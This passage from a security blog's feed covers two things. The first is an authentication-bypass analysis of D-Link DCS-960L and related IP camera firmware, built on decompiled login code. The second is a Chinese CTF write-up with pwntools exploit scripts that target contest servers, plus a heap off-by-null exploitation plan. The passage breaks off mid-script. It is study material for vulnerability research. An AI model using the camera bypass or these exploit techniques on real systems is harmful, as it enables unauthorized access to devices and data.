{</span><br><span class="line">          v23 = time(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( HIBYTE(v52[<span class="number">3018</span>]) &amp;&amp; HIBYTE(v52[<span class="number">3027</span>]) &amp;&amp; v23 - v52[<span class="number">3031</span>] &lt; <span class="number">301</span> &amp;&amp; (v24 = &amp;v52[<span class="number">3048</span>], v23 &gt;= v52[<span class="number">3031</span>]) )</span><br><span class="line">          {</span><br><span class="line">            v25 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            {</span><br><span class="line">              v26 = v24[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( !HIBYTE(v52[<span class="number">18</span> * v25 + <span class="number">3018</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !HIBYTE(v52[<span class="number">18</span> * v25 + <span class="number">3027</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v27 = v23 - v26 &gt;= <span class="number">301</span>;</span><br><span class="line">              v28 = v23 &lt; v26;</span><br><span class="line">              <span class="keyword">if</span> ( v27 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v25;</span><br><span class="line">              <span class="keyword">if</span> ( v28 )</span><br><span class="line">              {</span><br><span class="line">                --v25;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              }</span><br><span class="line">              v24 += <span class="number">18</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v25 == <span class="number">1000</span> )</span><br><span class="line">              {</span><br><span class="line">                ixmlAppendNewElement(Document, Element, <span class="string">"LoginResult"</span>, <span class="string">"failed"</span>);</span><br><span class="line">                v15 = Document;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          {</span><br><span class="line">            v25 = <span class="number">0</span>;</span><br><span class="line">          }</span><br><span class="line">          <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;v52[<span class="number">18</span> * v25 + <span class="number">3018</span>], <span class="number">0x23</span>u, <span class="string">"%s"</span>, v44);</span><br><span class="line">          <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;v52[<span class="number">18</span> * v25 + <span class="number">3027</span>], <span class="number">0xB</span>u, <span class="string">"%s"</span>, (<span class="type">const</span> <span class="type">char</span> *)v39);</span><br><span class="line">          v29 = &amp;v36[<span class="number">9</span> * v25];</span><br><span class="line">          v29[<span class="number">1566</span>] = v23;</span><br><span class="line">          *((_BYTE *)v29 + <span class="number">12544</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)v36, <span class="string">"admin"</span>) )</span><br><span class="line">            BYTE1(v52[<span class="number">18</span> * v25 + <span class="number">3034</span>]) = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            BYTE1(v52[<span class="number">18</span> * v25 + <span class="number">3034</span>]) = <span class="number">0</span>;</span><br><span class="line">          SIWriteBin(<span class="number">63</span>, v52, <span class="number">84072</span>);</span><br><span class="line">          ixmlAppendNewElement(Document, Element, <span class="string">"LoginResult"</span>, <span class="string">"success"</span>);</span><br><span class="line">          v15 = Document;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      v30 = Element;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>But in the <code>usrGetPass</code> function, if the username I enter is not in the user list, <code>v6=21</code>, <code>result = -1</code> and <code>a2 = null</code> . So I just need to get the challenge and public key, and then follow the above hmac_md5 calculation go get the correct passwod.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">usrGetPass</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">size_t</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+18h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = (<span class="type">const</span> <span class="type">char</span> **)&amp;dword_21DC8;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = *v7;</span><br><span class="line">    v7 += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      n = a3;</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(v8, a1);</span><br><span class="line">      a3 = n;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v6;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">21</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">strncpy</span>(a2, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_21DC4 + <span class="number">3</span> * v6 + <span class="number">2</span>), n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Affected-Models"><a href="#Affected-Models" class="headerlink" title="Affected Models"></a><strong>Affected Models</strong></h2><table><thead><tr><th>Model</th><th>Download Links</th></tr></thead><tbody><tr><td>DCS-960L</td><td><a href="https://d2okd4tdjucp2n.cloudfront.net/DCS-960L/DCS-960L_A1_FW_1.09.02.zip">https://d2okd4tdjucp2n.cloudfront.net/DCS-960L/DCS-960L_A1_FW_1.09.02.zip</a></td></tr><tr><td>DCS-935L</td><td><a href="https://d2okd4tdjucp2n.cloudfront.net/DCS-935L/DCS-935L_A1_FW_1.13.01_r4589.zip">https://d2okd4tdjucp2n.cloudfront.net/DCS-935L/DCS-935L_A1_FW_1.13.01_r4589.zip</a></td></tr><tr><td>DCS-8200LH</td><td><a href="https://www.dlinktw.com.tw/techsupport/download.ashx?file=11557">https://www.dlinktw.com.tw/techsupport/download.ashx?file=11557</a></td></tr></tbody></table><p>I only analyzed a very small part, there may be other vulnerabilities</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;DCS-960L-Equipment-Analysis&quot;&gt;&lt;a href=&quot;#DCS-960L-Equipment-Analysis&quot; class=&quot;headerlink&quot; title=&quot;DCS-960L Equi</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>2023年春秋杯网络安全联赛春季赛PWN(AK)</title>
    <link href="https://www.z1r0.top/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/"/>
    <id>https://www.z1r0.top/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/</id>
    <published>2023-05-19T05:54:42.000Z</published>
    <updated>2023-08-17T06:28:05.748Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="2023年春秋杯网络安全联赛春季赛PWN-AK"><a href="#2023年春秋杯网络安全联赛春季赛PWN-AK" class="headerlink" title="2023年春秋杯网络安全联赛春季赛PWN(AK)"></a>2023年春秋杯网络安全联赛春季赛PWN(AK)</h1><blockquote><p>每天花一个小时左右的时间做了一下</p></blockquote><img src="/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/2.png" alt="1" style="zoom:50%;"><h2 id="p2048"><a href="#p2048" class="headerlink" title="p2048"></a>p2048</h2><p>这题都没昨看就莫名其妙的出来了，调试的时候写了如下的exp，然后<code>wasd+enter</code>乱按就拿到shell了。如果一次不成功，可以再来一次（XD</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64', os='linux', log_level='debug')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./p2048'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.106.65.110'</span>, <span class="number">38152</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'aw'</span> * (<span class="number">0x1ee</span>) + <span class="string">b'B'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><img src="/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/1.png" alt="1" style="zoom:50%;"><h2 id="babyaul"><a href="#babyaul" class="headerlink" title="babyaul"></a>babyaul</h2><p>第一步需要修一下bins的头，修成如下样子就可以正常运行babyaul了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  babyaul xxd bins</span><br><span class="line">00000000: 1b4c 7561 5100 0104 0804 0800 0900 0000  .LuaQ...........</span><br><span class="line">00000010: 0000 0000 406c 7561 2e6c 7561 0000 0000  ....@lua.lua....</span><br><span class="line">00000020: 0000 0000 0000 0002 020b 0000 0001 4000  ..............@.</span><br><span class="line">00000030: 0007 0000 0001 c000 0007 8000 0024 0000  .............$..</span><br><span class="line">00000040: 0007 0001 0024 4000 0007 4001 0024 8000  .....$@...@..$..</span><br><span class="line">00000050: 0007 8001 001e 0080 0007 0000 0004 0800  ................</span><br><span class="line">00000060: 0000 0000 0000 7061 7373 7374 7200 0401  ......passstr...</span><br><span class="line">00000070: 0000 0000 0000 0000 0408 0000 0000 0000  ................</span><br></pre></td></tr></tbody></table></figure><p>利用unluac.jar反编译出lua源码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac/bin/unluac.jar  bins &gt; aul.lua</span><br></pre></td></tr></tbody></table></figure><p>lua源码如下</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">passstr = <span class="string">""</span></span><br><span class="line">is_pass = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span><span class="params">()</span></span></span><br><span class="line">  <span class="built_in">io</span>.<span class="built_in">write</span>(<span class="string">"pass:"</span>)</span><br><span class="line">  passstr = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*l"</span>)</span><br><span class="line">  is_pass = pass(<span class="built_in">string</span>.<span class="built_in">sub</span>(passstr, <span class="number">1</span>, <span class="number">4</span>))</span><br><span class="line">  <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"passed!"</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"pass faild!"</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">io</span>.<span class="built_in">write</span>(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">local</span> ops = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*l"</span>)</span><br><span class="line">    <span class="keyword">if</span> ops == <span class="string">"pass"</span> <span class="keyword">then</span></span><br><span class="line">      init_pass()</span><br><span class="line">      bypass()</span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">"add"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"size?"</span>)</span><br><span class="line">        size = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*number"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"mode?"</span>)</span><br><span class="line">        mode = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*number"</span>)</span><br><span class="line">        res_add = add_chunk(size, mode)</span><br><span class="line">        <span class="keyword">if</span> res_add == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"add success"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"add err!"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"pass first..."</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">"del"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"index?"</span>)</span><br><span class="line">        index = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*number"</span>)</span><br><span class="line">        res_del = del_chunk(index)</span><br><span class="line">        <span class="keyword">if</span> res_del == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"del success"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"del err!"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"pass first..."</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">"get"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_pass == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"index?"</span>)</span><br><span class="line">        index = <span class="built_in">io</span>.<span class="built_in">read</span>(<span class="string">"*number"</span>)</span><br><span class="line">        res_get = get_chunk(index)</span><br><span class="line">        <span class="keyword">if</span> res_get ~= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"get err!"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"pass first..."</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elseif</span> ops == <span class="string">"exit"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"exit"</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">  alarm(<span class="number">120</span>)</span><br><span class="line">  banner()</span><br><span class="line">  run()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到要过pass，逆一下pass的处理代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_615F</span><span class="params">(__int64 a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_6FF0(a1, <span class="number">0xFFFFFFFF</span>LL) )</span><br><span class="line">  {</span><br><span class="line">    v3 = sub_7240(a1, <span class="number">0xFFFFFFFF</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    sub_6D50(a1, <span class="number">-1</span>);</span><br><span class="line">    sub_5FF5(v3, (__int64)v4);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] != byte_2E140[i] )</span><br><span class="line">      {</span><br><span class="line">        sub_7460(a1, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    sub_7460(a1, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"not string!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>4个随机的数据，经过sha256加密输出，需要爆破出4个随机数据的具体数值，这里笔者直接在网站上爆破的，爆破完之后输入进去即可</p><p>漏洞是2.31下的off-by-null，直接套板子，打出overlapping之后任意地址写hook为magic_gadget，然后一套orw即可</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./babyaul'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.106.65.110'</span>, <span class="number">19233</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;'</span></span><br><span class="line">menu2 = <span class="string">'&gt;&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, mode1, content</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">'add'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size?\n'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'mode?\n'</span>, <span class="built_in">str</span>(mode1))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">'del'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index?\n'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu2, <span class="string">'get'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index?\n'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendafter(menu, <span class="string">'pass\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'pass'</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="built_in">input</span>(<span class="string">'give me pass: '</span>)</span><br><span class="line">li(pd)</span><br><span class="line"></span><br><span 